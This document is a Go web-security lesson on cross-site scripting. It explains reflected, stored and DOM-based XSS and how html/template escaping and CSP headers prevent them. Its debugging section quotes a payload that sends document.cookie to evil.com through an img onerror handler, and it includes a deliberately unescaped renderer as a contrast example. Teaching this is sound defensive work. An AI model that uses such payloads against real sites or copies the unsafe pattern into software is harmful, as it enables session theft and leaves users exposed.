# XSS

## Learning objective

Identify reflected, stored, and DOM-based Cross-Site Scripting (XSS) vulnerabilities and prevent them using Go's `html/template` auto-escaping, Content-Security-Policy headers, and proper output encoding.

## Why this matters

XSS is one of the most pervasive web vulnerabilities, consistently ranking in the OWASP Top 10. An XSS flaw lets an attacker execute arbitrary JavaScript in a victim's browser, which can steal session cookies, exfiltrate sensitive data, perform actions on behalf of the user, or deface the site. In Go, the `html/template` package provides powerful auto-escaping, but developers can bypass it with `template.HTML` or by using `fmt.Fprintf` to render HTML. Understanding XSS prevention is essential for any engineer building web applications or APIs that return HTML.

## Mental model

XSS is an injection attack, like SQL injection but targeting the browser's HTML parser instead of the database's SQL parser. User input is injected into a web page. If the input contains HTML or JavaScript, the browser interprets it as code instead of text.

Go's `html/template` acts as an automatic output encoder. It reads the template context (HTML body, HTML attribute, CSS, JavaScript, URL) and applies the correct encoding for that context. User input becomes text displayed on the page, never executable code.

```text
User input "Hello" -> template -> "Hello" (safe text)
User input "<script>bad()</script>" -> template -> "&lt;script&gt;bad()&lt;/script&gt;" (escaped text)
```

## Core idea

XSS has three main types:

| Type | How it works | Example |
|---|---|---|
| Reflected XSS | Malicious input is reflected immediately in the server response | Search query `<script>alert(1)</script>` echoed in the results page |
| Stored XSS | Malicious input is stored on the server and served to other users later | Comment containing `<script>stealCookies()</script>` saved to database |
| DOM-based XSS | Vulnerability exists entirely in client-side JavaScript, no server involvement | `document.write(location.hash)` with attacker-controlled hash |

Go's `html/template` prevents reflected and stored XSS at the server side when used correctly. DOM-based XSS requires client-side prevention.

## Under the hood

The `html/template` package parses template source into a tree of nodes. During execution, it tracks the contextual state as it walks the tree. For each insertion point, it determines the context (HTML body, attribute, URL, JavaScript, CSS) and applies the corresponding encoding function.

Context detection examples:
- `{{.}}` in HTML body: escapes `<`, `>`, `&`, `"`, `'` to HTML entities.
- `{{.}}` in `href="{{.}}"`: applies URL encoding and validates the URL scheme.
- `{{.}}` in `<script>var x = {{.}}</script>`: applies JavaScript string escaping.

The package also rejects dangerous patterns. For example, `javascript:` URLs are stripped, and `on*` event handler attributes cannot contain user data in a safe manner.

When a developer uses `template.HTML(...)` to mark content as safe HTML, all escaping is bypassed. This is the primary footgun in Go's template system.

## How Go uses it

Go's `html/template` is the standard library package for HTML templating in Go web applications. It is used by popular frameworks like Gin, Echo, and Chi under the hood, or directly in `net/http` handlers.

Key types and functions:
- `template.Must(template.New("name").Parse("template string"))` -- compiles a template, panics on error.
- `template.Execute(w, data)` -- renders the template to an `io.Writer` with auto-escaping.
- `template.HTML` -- a type that marks a string as safe HTML, bypassing escaping. Use sparingly and only with trusted content.
- `template.URL` -- marks a string as a safe URL.
- `template.JS` -- marks a string as safe JavaScript.

Production applications also set a Content-Security-Policy (CSP) header as defense-in-depth. Even if XSS occurs, CSP can restrict what scripts can execute.

## Go example

```go
package main

import (
	"fmt"
	"html/template"
	"strings"
)

type SafeRenderer struct{}

var safeTpl = template.Must(template.New("safe").Parse(`<html><body><h1>Hello, {{.}}!</h1></body></html>`))

func (s *SafeRenderer) Render(name string) string {
	var b strings.Builder
	err := safeTpl.Execute(&b, name)
	if err != nil {
		return fmt.Sprintf("render error: %v", err)
	}
	return b.String()
}

type UnsafeRenderer struct{}

func (u *UnsafeRenderer) Render(name string) string {
	return fmt.Sprintf("<html><body><h1>Hello, %s!</h1></body></html>", name)
}

func main() {
	unsafe := &UnsafeRenderer{}
	safe := &SafeRenderer{}

	fmt.Println("=== Unsafe (no escaping) ===")
	fmt.Println(unsafe.Render("<script>alert('XSS')</script>"))

	fmt.Println("\n=== Safe (html/template) ===")
	fmt.Println(safe.Render("<script>alert('XSS')</script>"))
}
```

## Step-by-step execution

For the unsafe renderer with input `<script>alert('XSS')</script>`:

1. User submits name containing `<script>alert('XSS')</script>`.
2. Code calls `fmt.Sprintf("<html>...%s...</html>", input)`.
3. Result: `<html><body><h1>Hello, <script>alert('XSS')</script>!</h1></body></html>`.
4. Browser renders the page. The HTML parser encounters `<script>` tags.
5. The script executes in the user's browser context.
6. The attacker can now access cookies, localStorage, and perform actions as the user.

For the safe renderer with the same input:

1. User submits the same input.
2. `html/template` detects the insertion point is in HTML body context.
3. Template engine applies `html.EscapeString` to the input.
4. Result: `<html><body><h1>Hello, &lt;script&gt;alert('XSS')&lt;/script&gt;!</h1></body></html>`.
5. Browser renders the escaped characters as text: `<script>alert('XSS')</script>` is displayed literally.
6. No script executes. The page is safe.

## Common mistakes

- Mistake: Using `template.HTML(userInput)` to render user-generated HTML content.
  - Why it happens: Developers need to render rich text (e.g., blog posts, comments) and think marking it as safe is acceptable.
  - Fix: Use a proper HTML sanitizer like `bluemonday` to strip dangerous tags and attributes before passing to the template. Never trust user-generated HTML.

- Mistake: Using `fmt.Fprintf` or `io.WriteString` instead of `template.Execute` for HTML responses.
  - Why it happens: Developers are comfortable with `fmt.Fprintf` and may not realize it produces unescaped output.
  - Fix: Always use `html/template` for any response that contains user data mixed with HTML.

- Mistake: Setting CSP headers incorrectly, giving a false sense of security.
  - Why it happens: CSP is complex. A policy of `script-src 'unsafe-inline'` completely defeats the purpose.
  - Fix: Start with a strict policy like `default-src 'self'` and loosen it carefully with nonces or hashes.

- Mistake: Escaping input instead of output.
  - Why it happens: Developers store escaped HTML in the database, then display it. This corrupts the data and can still be bypassed.
  - Fix: Always store raw data and escape on output. The template engine handles this automatically.

- Mistake: Ignoring context-sensitive escaping for attributes and URLs.
  - Why it happens: Developers escape for HTML body but not for attribute or URL contexts.
  - Fix: `html/template` handles this automatically. Do not bypass it with `template.HTML`.

## Debugging walkthrough

Consider this broken Go handler:

```go
func commentHandler(w http.ResponseWriter, r *http.Request) {
	comment := r.FormValue("comment")
	w.Header().Set("Content-Type", "text/html")
	fmt.Fprintf(w, "<div class=\"comment\">%s</div>", comment)
}
```

Symptom: A user reports that comments on the site execute JavaScript. The development team verifies that input is sanitized with a custom function before display.

Investigation: Check the actual HTTP response body. The custom sanitizer only strips `<script>` tags but allows event handlers:

```html
<div class="comment"><img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"></div>
```

Root cause: The custom sanitizer has a bypass. Even if it worked today, a new bypass could be discovered tomorrow.

Fix: Replace `fmt.Fprintf` with `html/template`:

```go
var commentTpl = template.Must(template.New("comment").Parse(`<div class="comment">{{.}}</div>`))

func commentHandler(w http.ResponseWriter, r *http.Request) {
	comment := r.FormValue("comment")
	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Content-Security-Policy", "default-src 'self'")
	commentTpl.Execute(w, comment)
}
```

The template escapes all dangerous characters. The CSP header provides an additional layer of defense.

## Production notes

- Always set a Content-Security-Policy header. A minimal policy for an API serving HTML is `default-src 'self'; script-src 'self'`.
- Use a CSP reporting endpoint (`report-uri` or `report-to`) to detect XSS attempts in production without breaking functionality.
- For applications that serve user-generated HTML content, sanitize with `bluemonday` and then serve through a separate domain without authentication cookies.
- Never render raw HTML at the application level. Use `html/template` for all server-rendered HTML.
- For JSON APIs, XSS prevention is the frontend's responsibility, but you can still set `X-Content-Type-Options: nosniff` and `Content-Disposition: attachment` headers.

## Performance implications

- `html/template` parsing happens once at startup (when using `template.Must`). Template execution is fast and comparable to `fmt.Sprintf`.
- Auto-escaping adds negligible overhead -- a few nanoseconds per template field.
- The main performance concern is template parsing and re-use: parse once at startup, execute many times.
- CSP headers add no server-side performance cost; they are just HTTP response headers.

## Practice task

Write a function `safeRender(comment string) string` that renders user comments in HTML with proper escaping and a CSP nonce-based script policy. Use `html/template` with a template that includes a `<script>` tag using a CSP nonce.

Your template should:
1. Display the comment in a `<p>` tag.
2. Include a harmless `<script>` tag using a nonce (e.g., `alert('loaded')`).
3. Set the CSP header with the nonce.

Write a `main()` that renders at least three comments: safe text, a script injection attempt, and an event handler injection attempt. Print the output to verify proper escaping.

## Tests / verification

```bash
go run ./curriculum/modules/10-auth-security/lessons/15-xss
go test ./curriculum/modules/10-auth-security/lessons/15-xss
```

The existing tests verify that unsafe rendering passes through injection payloads while safe rendering escapes them, and that the XSS detection helper correctly identifies dangerous patterns.

## Review questions

1. What is the difference between reflected XSS and stored XSS? Give an example of each.
2. How does Go's `html/template` know which encoding to apply to a template variable?
3. What is the purpose of the `template.HTML` type, and why is it dangerous when used with user input?
4. How does a Content-Security-Policy header mitigate XSS even if a vulnerability exists?
5. Why is output escaping preferred over input sanitization for preventing XSS?

## NEXT UP

CSRF -- Cross-Site Request Forgery attacks and how to prevent them with anti-CSRF tokens, SameSite cookies, and origin header validation.
